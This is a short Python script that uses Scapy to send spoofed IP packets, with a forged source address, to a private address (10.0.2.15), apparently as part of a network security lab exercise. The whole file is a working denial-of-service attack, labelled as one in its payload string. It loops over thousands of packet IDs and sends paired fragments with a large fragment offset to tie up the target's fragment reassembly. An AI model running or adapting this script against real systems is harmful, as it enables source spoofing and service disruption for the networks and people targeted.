#!/usr/bin/python3
from scapy.all import *

# Scapy Spoofing


payload = 'Dos Attack at 2023, Boom (>w<)!'

# udp = UDP(sport=7070, dport=9090)
# udp.len = 65535
ip = IP(src="1.2.3.4", dst="10.0.2.15") 


for id in range(10,10000):

    ## First Fragment
    ip.id = id
    ip.frag = 0
    ip.flags = 1
    pkt1 = ip/payload

    ## Second Fragment

    ip.frag = 64800
    ip.flags = 1
    ip.proto = 17
    pkt2 = ip/payload

    send(pkt1,verbose=0)
    send(pkt2,verbose=0)
print("Finish Sending Packets!")